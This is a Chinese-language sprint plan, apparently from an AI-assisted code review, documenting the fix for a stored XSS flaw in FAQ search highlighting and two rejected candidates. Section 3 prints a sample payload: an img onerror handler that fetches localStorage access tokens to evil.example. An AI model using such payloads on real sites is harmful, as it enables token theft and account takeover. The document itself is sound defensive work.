# Sprint 135 Plan — 儲存型/反射型 XSS 全掃描（DEF-102）

**Sprint**: Sprint 135
**日期**: 2026-09-07

---

## 1. 本輪範圍

延續 Sprint 134 收尾時記錄的兩個候選掃描角度，經 `AskUserQuestion` 讓使用者拍板：本輪先做「儲存型 XSS 全掃」，下一輪緊接著做「稽核日誌覆蓋率」，不中途停下來問。

執行方式：以 Workflow 進行三階段多 agent 系統性掃描（比照 Sprint 134 慣例）：
- **Discover**：4 個角度並行搜尋——前端所有繞過 React 跳脫的輸出點（`dangerouslySetInnerHTML`/`srcDoc`/`document.write`/`eval` 等）、後端所有產生 HTML 或允許呼叫端控制標記格式的邏輯、盤點所有使用者可自輸入的自由文字/連結欄位在前端的渲染方式、追查所有「網址類」欄位從輸入驗證到 `href`/`src` 綁定的完整路徑是否限制協定。
- **Analyze**：對 Discover 去重後的 18 筆候選逐一深入讀碼分析可利用性（預設保持懷疑）。
- **Verify**：對 Analyze 判定為可能真實的候選，各用 3 個獨立懷疑視角（correctness／reachability／impact）對抗式駁倒，多數決定生死。

結果：18 筆候選中 **1 筆確認為真實可利用漏洞（DEF-102）**，2 筆經驗證認定「輸入驗證確實有缺口，但目前無法達成 XSS 所需的『瀏覽器執行任意 JavaScript』後果」而不列入本輪修復範圍（詳見第 4 節）。

---

## 2. 執行原則（依 CLAUDE.md 強制規則）

每完成一項，立即編譯（`mvn compile`/`npm run type-check`/`npm run lint`）+ 執行相關測試，絕不累積開發。

---

## 3. DEF-102 修復摘要：FAQ 搜尋高亮儲存型 XSS

**問題**：`FaqService.highlightKeyword()`（`searchArticlesWithHighlight()` 使用）把使用者可控的 `highlightPrefix`/`highlightSuffix` 查詢參數（`FaqArticleController.java` 的 `/v2/faqs/search` 端點，`@RequestParam(required = false)`，完全未驗證）直接當作 regex replacement 字串包住比對到的關鍵字；更根本的是，對 `FaqArticle.question`/`answer` 的**原始文字本身也從未做任何 HTML escape**，就交給前端 `dashboard/faq/page.tsx` 的 `dangerouslySetInnerHTML` 原樣渲染。全代碼庫確認無任何 HTML 消毒機制（`jsoup`/`HtmlUtils`/`OWASP encoder` 等一律零命中）。

**可達成的攻擊鏈**：持有 `faq:create`/`faq:update` 權限的一般店主層級帳號（`STORE_OWNER`，非高權限內部帳號）即可在 `question`/`answer` 填入如 `<img src=x onerror="fetch('https://evil.example/c?t='+localStorage.getItem('accessToken'))">`；`CreateFaqArticleRequest`/`UpdateFaqArticleRequest` 僅有 `@NotBlank`/`@Size`，無任何內容過濾，原樣入庫。任何持有 `faq:read` 的使用者（含同租戶 `STORE_STAFF`、或註解明示可跨租戶管理 FAQ 的 `ADMIN`）開啟 `/dashboard/faq` 後，`payload` 即在其瀏覽器執行。由於 JWT access/refresh token 存放於 `localStorage`（`frontend/src/lib/axios.ts`），足以構成 token 竊取／帳號接管，且存在從租戶層級帳號打到平台 `ADMIN` 的提權路徑。`highlightPrefix`/`highlightSuffix` 本身在程式碼層級同樣可被任意標籤覆蓋，但全代碼庫僅有的前端呼叫端（`dashboard/faq/page.tsx`）從未轉發這兩個參數，故此子路徑目前無法對「別人」形成端到端攻擊（僅具備程式碼層級風險，屬於同一根因、一併修復）。

**修法**：

1. `highlightKeyword()` 改為先用 Spring 內建 `org.springframework.web.util.HtmlUtils.htmlEscape()` 跳脫原始文字，再以固定的 `<mark>`/`</mark>` 常數包住比對到的關鍵字——不再信任任何外部字串作為標籤內容。
2. 直接移除 `highlightPrefix`/`highlightSuffix` 這兩個可自訂標籤的參數（`FaqArticleController`、`FaqService.searchArticlesWithHighlight()` 簽章皆同步移除）：全代碼庫查證確認零消費端曾經使用非預設值（前端服務層型別、既有單元測試呼叫皆為 `null, null`），移除攻擊面比另外設計/維護一套標籤白名單驗證更簡單、更不會遺漏。
3. 前端 `dashboard/faq/page.tsx`：修正比修 escape 更根本的第二個問題——原本無論是否命中關鍵字，`article.question`/`article.answer`（純文字、從未跳脫）都會透過 `article.highlightedQuestion || article.question` 的 fallback 邏輯一併走 `dangerouslySetInnerHTML`，即使當次請求根本沒有觸發高亮。改為條件渲染：有 `highlightedQuestion`/`highlightedAnswer`（後端保證已跳脫，僅含安全的 `<mark>` 標籤）才用 `dangerouslySetInnerHTML`；否則以一般 JSX 插值渲染純文字（React 預設跳脫，安全）。
4. `frontend/src/services/faq.ts` 的 `searchFaqArticlesWithHighlight()` 參數型別同步移除 `highlightPrefix`/`highlightSuffix`（呼叫端本來就從未使用）。

**刻意不做的事（避免範圍蔓延）**：不在 `CreateFaqArticleRequest`/`UpdateFaqArticleRequest` 新增輸入端 HTML 驗證/清洗。輸出端修法（escape-before-highlight + 前端安全 fallback）已從結構上保證無論儲存內容為何都不會被當作可執行 HTML，輸入端加驗證屬於錦上添花而非本漏洞修復的必要條件。

---

## 4. 調查過程中發現、經驗證判定「非本輪範圍」的項目

Verify 階段對以下 2 筆候選皆為「資料流事實成立（攻擊者可控、無驗證、確實流向該 sink），但不構成 XSS」，3 位獨立懷疑者一致駁回，理由記錄如下，供未來排入獨立的輸入驗證強化 Sprint 參考：

1. **`frontend/src/app/(auth)/cart/page.tsx` 與各 listing 詳情頁的 `<img src={item.coverImageUrl}>`**：`Listing.coverImageUrl`（含 `CreateListingRequest`）全程無 `@URL`/`@Pattern` 驗證，任何賣家皆可填入任意字串。但現行主流瀏覽器對 `<img src>` 屬性**不會**執行 `javascript:` 或 `data:text/html` 協定（僅 `<a href>`/`<iframe src>`/表單 action 等少數 sink 才會），故無法達成 XSS 必要的「任意 JavaScript 執行」後果，判定非可利用漏洞。
2. **`backend/.../cms/Banner.java` 的 `linkUrl` 欄位**：`CreateBannerRequest`/`UpdateBannerRequest` 同樣無協定驗證，`GET /cms/banners/active` 為公開端點。但全代碼庫查證確認**目前沒有任何前端消費端**讀取或渲染此欄位（`grep` 全 `frontend/src` 零命中）——sink 尚不存在，無法建構端到端攻擊鏈，屬於「輸入驗證缺失 + 具備成為未來 XSS sink 的架構意圖」的潛伏性弱點。

兩者皆為真實的輸入驗證缺口（協定白名單缺失），建議在真正需要處理該類需求（例如未來要在 banner 或商品圖片改用可點擊連結時）之前，於 DTO 層一併補上 `http`/`https`/相對路徑的協定白名單，記錄為低優先級技術債（詳見 `DEFERRED_ITEMS_TRACKER.md` DEF-103／DEF-104），非本輪修復範圍。

---

## 5. 驗證

- 後端單元測試新增：`FaqServiceTest.searchWithHighlight_escapesHtmlInStoredText`（+1：question/answer 含 `<script>`/`<img onerror>` 時斷言不含原始標籤、跳脫實體正確保留、`<mark>` 高亮仍正常運作）；既有兩個 `searchArticlesWithHighlight` 呼叫點同步移除 `highlightPrefix`/`highlightSuffix` 參數，全數維持通過。
- `mvn -o compile` + `mvn -o checkstyle:check`：每次改動後立即執行，皆 0 violations。
- `mvn -o test -Dtest=FaqServiceTest`：20/20 通過。
- 前端 `npm run type-check`：0 errors；`npx eslint` 針對改動的 2 個檔案：0 warnings/errors；`npm run build`：成功。
- 後端全量回歸：`mvn -o verify`（含 `make test-db-up` 起真實 postgres：首次未起 test DB 導致 3 個既有整合測試因 `Connection refused` 失敗，屬環境前置未就緒，與本輪程式碼無關，起 DB 後重跑）**BUILD SUCCESS**：
  - 單元測試 **1129**（相對 Sprint 134 的 1128，+1，即本輪新增的 `FaqServiceTest.searchWithHighlight_escapesHtmlInStoredText`）
  - 整合測試 **475**（與 Sprint 134 相同，本輪未新增整合測試案例——`highlightPrefix`/`highlightSuffix` 參數移除屬純簽章變更，無既有整合測試涉及此二參數）
  - 0 Failures / 0 Errors / 0 Skipped
  - checkstyle（main + test）**0 violations**
  - PMD **0 violations**（`pmd:check` 未輸出違規即代表通過，`mvn -o verify` 整體 BUILD SUCCESS 已確認）
- 未新增/修改 Flyway migration（本輪未變更任何 `@Entity` 欄位型別/資料庫結構），`make validate-schema`/`make validate-schema-doc` 不適用
